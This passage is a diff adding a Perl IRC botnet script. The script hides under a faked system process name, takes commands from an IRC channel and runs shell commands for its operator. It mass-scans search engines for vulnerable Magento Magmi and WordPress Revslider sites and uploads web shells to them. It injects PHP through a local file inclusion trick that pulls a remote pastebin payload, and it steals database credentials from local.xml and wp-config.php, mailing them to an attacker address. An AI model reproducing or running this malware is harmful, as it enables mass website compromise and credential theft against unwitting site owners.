@@ -1,0 +1,1051 @@
+#!/usr/bin/perl
+print('
+	##################
+	# magento @2015  #
+	##################
+	');
+###################################################################################################################
+use HTTP::Request;
+use HTTP::Request::Common;
+use HTTP::Request::Common qw(POST);
+use LWP::Simple;
+use LWP 5.64;
+use LWP::UserAgent;
+use Socket;
+use IO::Socket;
+use IO::Socket::INET;
+use IO::Select;
+###################################################################################################################
+my @fake		= ("/usr/sbin/httpd","/usr/local/apache/bin/httpd -DSSL","/sbin/syslogd","[eth0]","/sbin/klogd -c 1 -x -x","/usr/sbin/acpid","/usr/sbin/cron","[httpds]","/usr/sbin/httpd","[bash]"); 
+my $fakeproc	= $fake[rand(scalar(@fake))];
+my $ircserver	= "irc.malangunderground.org";
+my $ircport		= "6667";
+my $nickname	= "[".int(rand(9))."]".int(rand(9))."[".int(rand(9))."]";
+my $ident		= "xxx00xxx";
+my $channel		= "#djarum";
+my $dbgchan		= "#djarumx";
+my $admin		= "Kodox";
+my $fullname	= "xxx00xxx";
+my $to 			= 'bebeknya.tuyul@hotmail.com';
+my $from 		= 'bot@scan.irc';
+my $subject 	= 'New Shell';
+
+my $logo	    = "9,1[4!9]"; # [!]
+my $magecmd		= "!magento";
+my $revcmd		= "!revslider";
+my $magemanual	= "&inject";
+my $lfimanual 	= "&lfi";
+my $mag_plugins = "plugins.zip";
+my $mag_package = "magmi_0.7.21.zip";
+my @uagents   	= ('Mozilla/5.0');
+my $uagent		= $uagents[rand(scalar(@uagents))];
+my $engine		= "GooGLe,GooGle2,WaLLa,AsK,AsK2,CLusTy,BiNg,BiNg2,bYpasS,UoL,SeZNam,HotBot,AoL,BigLobe,GpRoXy,LyCoS,WeB.De,cRaWLeR,dMoZ";
+# Google-Bypass
+my @bypasser  = ('http://www.napodpatky.cz//wp-content/plugins/mail.php');
+my $bypass    = $bypasser[rand(scalar(@bypasser))];
+my $poksai 	  = "http://blackhaircafe.com/includes/js/tabs/errors.php?____pgfa=";
+my $injectr	  = "http://www.viajesortiz.es/wp-content/shop.php";
+my $inject0r = "http://www.winkleightimber.co.uk/errors/inject.php?site=";
+$SIG{'INT'}   = 'IGNORE';
+$SIG{'HUP'}   = 'IGNORE';
+$SIG{'TERM'}  = 'IGNORE';
+$SIG{'CHLD'}  = 'IGNORE';
+$SIG{'PS'}	  = 'IGNORE';
+
+$0 = "$fakeproc"."\0" x 16;
+my $pid = fork;
+exit if $pid;
+die "\n[!] ERROR [!]\n" unless defined($pid);
+
+our %irc_servers;
+our %DCC;
+my $dcc_sel = new IO::Select->new();
+$sel_client = IO::Select->new();
+sub sendraw {
+	if ($#_ == '1') {
+		my $socket = $_[0];
+		print $socket "$_[1]\n";
+		} else {
+			print $IRC_cur_socket "$_[0]\n";
+		}
+	}
+	sub connector {
+		my $mynick = $_[0];
+		my $ircserver_con = $_[1];
+		my $ircport_con = $_[2];
+		my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
+		if (defined($IRC_socket)) {
+			$IRC_cur_socket = $IRC_socket;
+			$IRC_socket->autoflush(1);
+			$sel_client->add($IRC_socket);
+			$irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
+			$irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
+			$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
+			$irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
+			nick("$mynick");
+			sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
+			sleep (1);
+		}
+	}
+	sub parse {
+		my $servarg = shift;
+		if ($servarg =~ /^PING \:(.*)/) {
+			sendraw("PONG :$1");
+		}
+		elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
+			if (lc($1) eq lc($mynick)) {
+				$mynick = $4;
+				$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
+			}
+		}
+		elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
+			nick($mynick);
+		}
+		elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
+			$mynick = $2;
+			$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
+			$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
+			sendraw("MODE $mynick +Bxp");
+			sendraw("JOIN $channel");
+			sendraw("JOIN $dbgchan");
+			sleep(1);
+			sendraw("PRIVMSG $admin : Hi $admin im here !");
+		}
+	}
+	my $line_temp;
+	while( 1 ) {
+		while (!(keys(%irc_servers))) { &connector("$nickname", "$ircserver", "$ircport"); }
+		select(undef, undef, undef, 0.01);
+		delete($irc_servers{''}) if (defined($irc_servers{''}));
+		my @ready = $sel_client->can_read(0);
+		next unless(@ready);
+		foreach $fh (@ready) {
+			$IRC_cur_socket = $fh;
+			$mynick = $irc_servers{$IRC_cur_socket}{'nick'};
+			$nread = sysread($fh, $ircmsg, 4096);
+			if ($nread == 0) {
+				$sel_client->remove($fh);
+				$fh->close;
+				delete($irc_servers{$fh});
+			}
+			@lines = split (/\n/, $ircmsg);
+			$ircmsg =~ s/\r\n$//;
+			if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
+				my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);
+				if ($path eq $mynick) {
+					if (&isAdmin($nick) && $msg eq "!die") {
+						&shell("$path","kill -9 $$");
+					}
+					if (&isAdmin($nick) && $msg eq "!killall") {
+						&shell("$path","pkill -9 perl");
+					}
+					if (&isAdmin($nick) && $msg eq "!reset") {
+						sendraw("QUIT :Re-fresh!");
+					}
+					if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
+						sendraw("JOIN #".$1);
+					}
+					if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
+						sendraw("PART #".$1);
+					}
+					if (&isAdmin($nick) && $msg =~ /^!nick (.+)/) {
+						sendraw("NICK ".$1);
+					}
+					if (&isAdmin($nick) && $msg =~ /^!pid/) {
+						sendraw($IRC_cur_socket, "PRIVMSG $nick :$logo 14 Fake/PID :15 $fakeproc - $$");
+					}
+				}
+				else {
+					if (&isAdmin($nick) && $msg eq "!die") {
+						&shell("$path","kill -9 $$");
+					}
+					if (&isAdmin($nick) && $msg eq "!killall") {
+						&shell("$path","pkill -9 perl");
+					}
+					if (&isAdmin($nick) && $msg eq "!reset") {
+						sendraw("QUIT :Re-fresh!");
+					}
+					if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
+						sendraw("JOIN #".$1);
+					}
+					if (&isAdmin($nick) && $msg eq "!part") {
+						sendraw("PART $path");
+					}
+					if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
+						sendraw("PART #".$1);
+					}
+					if (&isAdmin($nick) && $msg =~ /^\.sh (.*)/) {
+						&shell("$path","$1");
+					}
+					if (&isAdmin($nick) && $msg =~ /^!pid/) {
+						&msg("$path","$logo14 Fake Process/PID :15 $fakeproc - $$ $logo");
+					}
+					if ($msg =~ /^$lfimanual\s+(.*)/) {
+						my $trg = $1;
+						my $mlfi = "http://".$trg."magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../../..//proc/self/environ&plugintype=utilities&pluginclass=CustomSQLUtility";
+						&mage_lfi($mlfi);
+						my $glfi = &get_content($mlfi);
+						if(glfi =~ /HTTP_USER_AGENT/i){
+							&msg("$admin","$logo14 Magento $logo9 ".$mlfi." ");
+						}
+						my $cek = &get_content("http://".$trg."image.php");
+						if($cek =~ /MrShahab/){
+							&msg("$chan","$logo14 Magento $logo9 ".$trg." [OK]LFI Sukses");
+							&msg("$admin","$logo14 Magento $logo9 ".$trg."image.php");
+							my $box = "[+]Site: http://".$trg."/image.php\n";
+							&mailer($box);
+						}
+					}
+					if ($msg =~ /^$magemanual\s+(.*)/) {
+						my $tg = $1;
+						if($tg !~ /http:/){ $tg = "htpp://".$1.""}
+						my $tgx = $tg."/magmi/web/plugin_upload.php";
+						&msg("$path","$logo14 Exploiting -> 15 $tgx $logo");
+						&mage1_query($tgx); sleep(1);
+						my $chk = &get_content($tg."/magmi/plugins/plugins.php");
+						if ($chk =~ /MrShahab/) {					
+							&msg("$path","$logo14 Magento $logo9 ".$tg." [Plugins Uploaded] ");
+							&msg("$admin","$logo14 Magento $logo9 ".$tg."/magmi/plugins/plugins.php ");		
+							} else { 
+								&msg("$path","$logo14 Magento $logo4 ".$tg." [Plugins Failed]");
+								my $tgz = $tg."/magmi/web/magmi_upload.php";
+								&mage2_query($tgz); sleep(1);
+								my $chx = &get_content($tg."/magmi/web/plugins.php");
+								if ($chk =~ /MrShahab/){
+									&msg("$path","$logo14 Magento $logo9 ".$tg." [Package Uploaded] ");
+									&msg("$admin","$logo14 Magento $logo9 ".$tg."/magmi/plugins/plugins.php ");
+									} else { &msg("$path","$logo14 Magento $logo4 ".$tg." [Package Failed]"); }
+								}
+							}
+				##################################################################### HELP COMMAND
+
+				if ($msg =~ /^!help/) {
+					my $helplogo = "$logo 4Help $logo";
+					&msg("$path","$helplogo 14,1 ######################################### $logo");
+					&msg("$path","$helplogo 14,1 #15 [ Magmi-RFI ] $magecmd [dork] ");
+					&msg("$path","$helplogo 14,1 ######################################### $logo");
+				}
+
+				##################################################################### Mage
+
+				if ($msg =~ /^$magecmd\s+(.*)/) {
+					if (my $pid = fork) {
+						waitpid($pid, 0);
+					}
+					else {
+						if (fork) { exit; } else {
+							my ($bug,$dork) = ("magmi/web/magmi.php",$1);
+							&msg("$path","$logo14 [Magento] d0Rk :15 $dork $logo");
+							&msg("$path","$logo14 [Magento] BugZ :15 $bug $logo");
+							&msg("$path","$logo15 Search Engine Loading $logo");
+							&scan_start($path,$bug,$dork,$engine,1);
+						}
+						exit;
+					}
+				} elsif($msg =~ /^$revcmd\s+(.*)/) {
+					if (my $pid = fork) {
+						waitpid($pid, 0);
+					} else {
+						if(fork) { exit; } else {
+							my($bug,$dork) = ("wp-admin/admin-ajax.php",$1);
+							&msg("$path","$logo14 [Revslider] d0Rk :15 $dork $logo");
+							&msg("$path","$logo14 [Revslider] BugZ :15 $bug $logo");
+							&msg("$path","$logo15 Search Engine Loading $logo");
+							&scan_start($path,$bug,$dork,$engine,2);
+						}
+					}
+				}
+			}
+		}
+		for(my $c=0; $c<= $#lines; $c++) {
+			$line = $lines[$c];
+			$line = $line_temp.$line if ($line_temp);
+			$line_temp = '';
+			$line =~ s/\r$//;
+			unless ($c == $#lines) {
+				&parse("$line");
+				} else {
+					if ($#lines == 0) {
+						&parse("$line");
+						} elsif ($lines[$c] =~ /\r$/) {
+							&parse("$line");
+							} elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
+								&parse("$line");
+								} else {
+									$line_temp = $line;
+								}
+							}
+						}
+					}
+				}
+
+#########################################
+sub scan_start() {
+	my ($chan,$bug,$dork,$engine,$type) = @_;
+	if ($engine =~ /google/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLe",$type); } exit; } }
+	if ($engine =~ /google2/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGle2",$type); } exit; } }
+	if ($engine =~ /walla/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"WaLLa",$type); } exit; } }
+	if ($engine =~ /ask/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsK",$type); } exit; } }
+	if ($engine =~ /ask2/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsK2",$type); } exit; } }
+	if ($engine =~ /clusty/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"CLusTy",$type); } exit; } }
+	if ($engine =~ /bing/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BiNg",$type); } exit; } }
+	if ($engine =~ /bing2/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BiNg2",$type); } exit; } }
+	if ($engine =~ /bypass/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"bYpasS",$type); } exit; } }
+	if ($engine =~ /uol/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"UoL",$type); } exit; } }
+	if ($engine =~ /seznam/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"SeZNam",$type); } exit; } }
+	if ($engine =~ /hotbot/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"HotBot",$type); } exit; } }
+	if ($engine =~ /aol/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AoL",$type); } exit; } }
+	if ($engine =~ /biglobe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BigLobe",$type); } exit; } }
+	if ($engine =~ /gproxy/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GpRoXy",$type); } exit; } }
+	if ($engine =~ /lycos/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"LyCoS",$type); } exit; } }
+	if ($engine =~ /webde/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"WeB.De",$type); } exit; } }
+	if ($engine =~ /crawler/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"cRaWLeR",$type); } exit; } }
+	if ($engine =~ /dmoz/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"dMoZ",$type); } exit; } }
+}
+sub type () {
+	my ($chan,$bug,$dork,$engine,$type) = @_;
+	if ($type == 1){$type=&magmi($chan,$bug,$dork,$engine);}
+	if ($type == 2){$type=&revsl($chan,$bug,$dork,$engine);}
+} 
+######################################### EXPLOITING
+sub magmi() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $dork = $_[2];
+	my $engine = $_[3];
+	my $count = 0;
+	my @list = &search_engine($chan,$bug,$dork,$engine,$logo);
+	my $num = scalar(@list);
+	if ($num > 0){
+		foreach my $site(@list){
+			$count++;
+			if ($count == $num-1) { my @list = (); &msg("$chan","$logo14 Magento $logo15 FinizZ!14 $engine : $dork "); }
+			&msg("$dbgchan","$logo14 [$count/$num] $engine $logo15 $site");
+			
+			# Cek Shoplift #
+			my $shp = "http://www.winkleightimber.co.uk/errors/inject.php?target=http://".$site;
+			my $lift = &get_content($shp);
+			if($lift =~ /"Success"/){
+				#&msg("$chan","$logo14 Magento $logo15 ".$shp." 9[ShopLift] ");
+				my $lift = &shoplift($site);
+				if($lift =~ m/@(.*) - (.*)/g){
+					&msg("$chan","$logo14 Magento $logo9[ShopLift]15 http://".$site."admin ");
+					$lift1 = &get_content($inject0r.$site."admin");
+					if($lift1 =~ /Sukses Login/){
+						&msg("$admin","$logo14 Magento $logo9[ShopLift]15 http://".$site."admin - Sukses Login");
+					}
+					} else { &msg("$chan","$logo14 Magento $logo15 @".$site." - Cek Injector Manual ! ");}
+				} 
+			#else {
+			#	&msg("$dbgchan","$logo14 Magento $logo15 ".$shp." 4[".$lift."] "); 
+			#}
+			
+			# Cek DB Login #
+			my $serverIP; my $dbname; my $user; my $pass; my $prefix; my $pgadmin; my $out;
+			my $xmlfile = "http://".$site."app/etc/local.xml";
+			my $leakxml = &get_content($xmlfile);
+			sleep(1);
+			if ($leakxml =~ /<connection>/ )
+			{
+				my $pma = &get_content("http://".$site."phpmyadmin");
+				&msg("$chan","$logo14 Magento $logo15 ".$xmlfile." 9[DBLeaked] ");
+				# /<key><!\[\CDATA\[(.*)\]\]\><\/key>/
+				if ($leakxml =~ m/<table_prefix><!\[\CDATA\[(.*)\]\]\><\/table_prefix>/g){$prefix = $1;}
+				if ($leakxml =~ m/<host><!\[\CDATA\[(.*)\]\]\><\/host>/g) {$serverIP = $1;}
+				if ($leakxml =~ m/<username><!\[\CDATA\[(.*)\]\]\><\/username>/g){$user = $1;}
+				if ($leakxml =~ m/<password><!\[\CDATA\[(.*)\]\]\><\/password>/g){$pass = $1;}
+				if ($leakxml =~ m/<dbname><!\[\CDATA\[(.*)\]\]\><\/dbname>/g){$dbname = $1;}
+				if ($leakxml =~ m/<frontName><!\[\CDATA\[(.*)\]\]\><\/frontName>/g){$pgadmin = $1;}
+				$out = "[+]Host: $serverIP\n[+]User: $user\n[+]Pass: $pass\n[+]Prefix: $prefix\n[+]DBName: $dbname\n[+]PageAdmin: $pgadmin";
+				&msg("$admin","$logo14 ======================================================== $logo ");
+				&msg("$admin","$logo14 Magento $logo 14[+]DBSite:15 http://".$site." ");           
+				&msg("$admin","$logo14 Magento $logo 14[+]Host:15 ".$serverIP." ");           
+				&msg("$admin","$logo14 Magento $logo 14[+]User:15 ".$user." ");           
+				&msg("$admin","$logo14 Magento $logo 14[+]Pass:15 ".$pass." "); 
+				&msg("$admin","$logo14 Magento $logo 14[+]Prefix:15 ".$prefix." ");
+				&msg("$admin","$logo14 Magento $logo 14[+]DBName:15 ".$dbname." ");           
+				&msg("$admin","$logo14 Magento $logo 14[+]PageAdmin:15 ".$pgadmin." ");
+				if ($pma =~ /phpMyAdmin/){
+						&msg("$admin","$logo14 Magento $logo 14[+]PhpMyAdmin:15 ".$site."phpmyadmin ");
+					} else{
+						&msg("$admin","$logo14 Magento $logo 14[+]PhpMyadmin:15 Not Found");
+					}     
+
+			}
+			else {
+				my $inifile = "http://".$site."magmi/conf/magmi.ini";
+				my $leakini = &get_content($inifile);
+				sleep(1);
+				if ($leakini =~ /connectivity =/ )
+				{
+					my $pma = &get_content("http://".$site."phpmyadmin");
+					&msg("$chan","$logo14 Magento $logo15 ".$inifile." 9[DBLeaked] ");
+					if ($leakini =~ m/host = \"(.*)\"/g) {$serverIP = $1;}
+					if ($leakini =~ m/dbname = \"(.*)\"/g){$dbname = $1;}
+					if ($leakini =~ m/user = \"(.*)\"/g){$user = $1;}
+					if ($leakini =~ m/password = \"(.*)\"/g){$pass = $1;}
+					if ($leakini =~ m/table_prefix = \"(.*)\"/g){$prefix = $1;}
+					$out = "[+]Host: $serverIP\n[+]User: $user\n[+]Pass: $pass\n[+]Prefix: $prefix\n[+]DBName: $dbname";
+					&msg("$admin","$logo14 ======================================================== $logo ");
+					&msg("$admin","$logo14 Magento $logo 14[+]DBSite:15 http://".$site." ");           
+					&msg("$admin","$logo14 Magento $logo 14[+]Host:15 ".$serverIP." ");           
+					&msg("$admin","$logo14 Magento $logo 14[+]User:15 ".$user." ");           
+					&msg("$admin","$logo14 Magento $logo 14[+]Pass:15 ".$pass." "); 
+					&msg("$admin","$logo14 Magento $logo 14[+]Prefix:15 ".$prefix." ");
+					&msg("$admin","$logo14 Magento $logo 14[+]DBName:15 ".$dbname." ");
+					if ($pma =~ /phpMyAdmin/){
+						&msg("$admin","$logo14 Magento $logo 14[+]PhpMyAdmin:15 ".$site."phpmyadmin ");
+					} else{
+						&msg("$admin","$logo14 Magento $logo 14[+]PhpMyadmin:15 Not Found");
+					}                    
+				}
+			}
+			
+			# Cek Magmi #
+			my $crot  = "http://".$site.$bug;
+			my $crotx = "http://".$site."magmi/web/plugin_upload.php";
+			my $vuln = &get_content($crot);
+			if ($vuln =~ /v0.7.1/) {
+				&mage1_query($crotx); sleep(1);
+				my $check = &get_content("http://".$site."magmi/plugins/plugins.php");
+				if ($check =~ /MrShahab/) {					
+					&msg("$chan","$logo14 Magento $logo9 ".$site." [OK]Plugins Upload ");
+					&msg("$admin","$logo14 Magento $logo9 ".$site."magmi/plugins/plugins.php ");
+					my $box = "[+]Site: http://".$site."/magmi/plugins/plugins.php\n".$out."";
+					&mailer($box);					
+				}
+				else {
+					&msg("$chan","$logo14 Magento $logo15 ".$crot." 4[Plugins Failed]");
+					my $crotz = "http://".$site."magmi/web/magmi_upload.php";				
+					&mage2_query($crotz); sleep(1);
+					my $chex = &get_content("http://".$site."magmi/web/image.php");
+					if ($chex =~ /MrShahab/) {					
+						&msg("$chan","$logo14 Magento $logo9 ".$site." [OK]Package Upload ");
+						&msg("$admin","$logo14 Magento $logo9 ".$site."magmi/web/image.php ");
+						my $box = "[+]Site: http://".$site."/magmi/web/plugins.php\n".$out."";
+						&mailer($box);
+					} 
+					else {
+						&msg("$chan","$logo14 Magento $logo15 ".$crot." 4[Package Failed]");
+						my $mlfi = "http://".$site."magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../../..//proc/self/environ&plugintype=utilities&pluginclass=CustomSQLUtility";
+						&mage_lfi($mlfi);
+						my $glfi = &get_content($mlfi);
+						if(glfi =~ /HTTP_USER_AGENT/i){
+							&msg("$admin","$logo14 Magento $logo9 ".$mlfi." ");
+						}
+						my $cek = &get_content("http://".$site."image.php");
+						if($cek =~ /MrShahab/){
+							&msg("$chan","$logo14 Magento $logo9 ".$site." [OK]LFI Sukses");
+							&msg("$admin","$logo14 Magento $logo9 ".$site."magmi/web/image.php");
+							my $box = "[+]Site: http://".$site."/image.php\n".$out."";
+							&mailer($box);
+						}
+					}
+				} 
+			}
+		}
+	}
+}
+sub revsl() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $dork = $_[2];
+	my $engine = $_[3];
+	my $count = 0;
+	my @list = &search_engine($chan,$bug,$dork,$engine,$logo);
+	my $num = scalar(@list);
+	if ($num > 0){
+		foreach my $site(@list){
+			$count++;
+			if ($count == $num-1) { my @list = (); &msg("$chan","$logo14 Revslider $logo15 FinizZ!14 $engine : $dork "); }
+			&msg("$dbgchan","$logo14 [$count/$num] $engine $logo15 $site");
+			
+			#Revslider Shell#
+			my $revs = revinject($site);
+			if($revs =~ /Sukses Bos/i){$path=$1;}
+			my $shell = "http://".$site.$path;
+			my $jos = &get_content($shell);
+			my $lel = $shell."?x=kernel";
+			my $lol = &get_content($lel);
+			if($jos =~ /MrShahab/i){
+				&get_content($shell."?x=clone");
+				&get_content($shell."?x=revpatch");
+				&msg("$chan","$logo14 Revslider $logo9 ".$site." 9[Shell Uploaded]")
+				&msg("$admin","$logo14 Revslider $logo9 ".$site."wp-admin/xx.php (".$lol.")");
+				&msg("$admin","$logo14 Revslider $logo9 ".$shell."(".$lol.")");
+				my $box = "[+]Site: http://".$shell."\nKernel : ".$lol;
+				&mailer($box);
+			}
+			##################DB Inject#########################
+			my $serverIP; my $dbname; my $user; my $pass; my $out;
+			my $bugdb = "http://".$site.$bug."?action=revslider_show_image&img=../wp-config.php";
+			my $getdb = &get_content($bugdb);
+			if($getdb =~ /DB_NAME/i){
+				if ($html =~ /\DB_NAME\', '(.*)'\);/) {$dbname=$1;}
+				if ($html =~ /\DB_USER\', '(.*)'\);/) {$user=$1;}
+				if ($html =~ /\DB_PASSWORD\', '(.*)'\);/) {$pass=$1;}
+				if ($html =~ /\DB_HOST\', '(.*)'\);/) {$serverIP=$1;}
+				my $pma = &get_content("http://".$site."phpmyadmin");
+				&msg("$admin","$logo14 Revslider $logo 14 http://".$bugdb." [DB Leaked] ");
+				&msg("$admin","$logo14 Revslider $logo 14[+]DBSite:15 http://".$site." ");           
+				&msg("$admin","$logo14 Revslider $logo 14[+]Host:15 ".$serverIP." ");           
+				&msg("$admin","$logo14 Revslider $logo 14[+]User:15 ".$user." ");           
+				&msg("$admin","$logo14 Revslider $logo 14[+]Pass:15 ".$pass." "); 
+				if($pma =~ /PhpMyAdmin/){
+					&msg("$admin","$logo14 Revslider $logo 14[+]PhpMyadmin:15 ".$site."phpmyadmin "); 
+					} else {
+						&msg("$admin","$logo14 Revslider $logo 14[+]PhpMyadmin:15 Not Found"); 
+					}
+				}
+			}
+		}
+	}
+#########################################
+sub search_engine() {
+	my (@total,@clean);
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $dork = $_[2];
+	my $engine = $_[3];
+	my $logo = $_[4];
+	if ($engine eq "GooGLe") { my @google = &google($dork); push(@total,@google); }
+	if ($engine eq "GooGle2") { my @google2 = &google2($dork); push(@total,@google2); }
+	if ($engine eq "WaLLa") { my @walla = &walla($dork); push(@total,@walla); }
+	if ($engine eq "AsK") { my @ask = &ask($dork); push(@total,@ask); }
+	if ($engine eq "AsK2") { my @ask2 = &ask2($dork); push(@total,@ask2); }
+	if ($engine eq "CLusTy") { my @clusty = &clusty($dork); push(@total,@clusty); }
+	if ($engine eq "BiNg") { my @bing = &bing($dork); push(@total,@bing); }
+	if ($engine eq "BiNg2") { my @bing2 = &bing2($dork); push(@total,@bing2); }
+	if ($engine eq "bYpasS") { my @bypass = &bypass($dork); push(@total,@bypass); }
+	if ($engine eq "UoL") { my @uol = &uol($dork); push(@total,@uol); }
+	if ($engine eq "SeZNam") { my @seznam = &seznam($dork); push(@total,@seznam); }
+	if ($engine eq "HotBot") { my @hotbot = &hotbot($dork); push(@total,@hotbot); }
+	if ($engine eq "AoL") { my @aol = &aol($dork); push(@total,@aol); }
+	if ($engine eq "BigLobe") { my @biglobe = &biglobe($dork); push(@total,@biglobe); }
+	if ($engine eq "GpRoXy") { my @gproxy = &gproxy($dork); push(@total,@gproxy); }
+	if ($engine eq "LyCoS") { my @lycos = &lycos($dork); push(@total,@lycos); }
+	if ($engine eq "WeB.De") { my @webde = &webde($dork); push(@total,@webde); }
+	if ($engine eq "cRaWLeR") { my @crawler = &crawler($dork); push(@total,@crawler); }
+	if ($engine eq "dMoZ") { my @dmoz = &dmoz($dork); push(@total,@dmoz); }
+	@clean = &clean(@total);
+	my $clr = scalar(@clean);
+	if($clr > 0){
+		&msg("$chan","$logo14 Magento $logo15 $engine $logo14 Total:15 [".scalar(@total)."]14 Clean:15 [".scalar(@clean)."] ");
+	}
+	return @clean;
+}
+
+#########################################
+sub mailer() {
+	my $isi = $_[0];
+	open(mailer, "|/usr/sbin/sendmail -t");
+	print mailer "To: $to\nFrom: $from\nSubject: $subject\n\n$isi";
+	close(mailer); 
+}
+sub shoplift() {
+	my $url = $_[0];
+	my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
+	$ua->timeout(120);
+	$ua->agent($uagent);
+	my $req = HTTP::Request->new(POST => $injectr);
+	$req->content_type('application/x-www-form-urlencoded');
+	$req->content('target='.$url.'&prefix=&exploit=Exploit');
+	my $res = $ua->request($req);
+	if ($res->is_success) { return $res->decoded_content; }
+	else { return $res->status_line; }
+}
+sub get_content() {
+	my $url = $_[0];
+	my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
+	$ua->timeout(120);
+	$ua->agent($uagent);
+	my $req = HTTP::Request->new(GET => $url);
+	my $res = $ua->request($req);
+	if ($res->is_success) { return $res->decoded_content; }
+	else { return $res->status_line; }
+}	
+sub mage1_query() {
+	my $url = $_[0];
+	my $ua  = LWP::UserAgent->new(agent => $uagent);
+	$ua->timeout(120);
+	my $req = $ua->post($url,Content_Type=>'multipart/form-data',Content=>["plugin_package"=>["$mag_plugins"]]);
+	return $req->content;
+}
+sub mage2_query() {
+	my $url = $_[0];
+	my $ua  = LWP::UserAgent->new(agent => $uagent);
+	$ua->timeout(120);
+	my $req = $ua->post($url,Content_Type=>'multipart/form-data',Content=>["magmi_package"=>["$mag_package"]]);
+	return $req->content;
+}
+sub mage_lfi() {
+	my $url = $_[0];
+	my $cmd = "MrShahab<?php $x = file_get_contents('http://pastebin.com/raw.php?i=AEbhJNFL');$xx = fopen('../../image.php','w');fwrite($xx,$x);fclose($xx);?>";
+	my $ua = LWP::UserAgent->new(agent => $cmd);
+	$ua->timeout(120);
+	my $req = $ua->get($url);
+	return $req->content;
+}
+######################################### SEARCH ENGINE 
+sub google() {
+	my @list;
+	my $key = $_[0];
+	my $num = 10; my $max = 1000; my $p; my $token;
+	my $go  = "http://www.google.com/search?q=".&key($key)."&filter=0&start=".$p;
+	my $gl = &get_content($go);
+	while ($gl =~ m/href=\"\/search?q=(.*?);ei=(.*?)&amp;start=(.*?)\" id=\"pnnext\"/g){ my $token = $2;}
+	for ($p=10; $p<=$max; $p+=$num){
+		my $search = "http://www.google.com/search?q=".&key($key)."&ei=".$token."&start=".$p."&sa=N&filter=0";
+		my $res = &get_content($search);
+		while ($res =~ m/<h3 class=\"r\"><a href=\"(.*?):\/\/(.*?)\"/g) {
+			my $link = $2;
+			if ($link !~ /google|github.com|stackoverflow.com|stackexchange.com|magentocommerce.com|googlecode.com|sourceforge.net/){ my @grep = &links($link); push(@list,@grep); }
+		}
+		} return @list;
+	}		
+	sub google2() {
+		my @list;
+		my $key = $_[0];
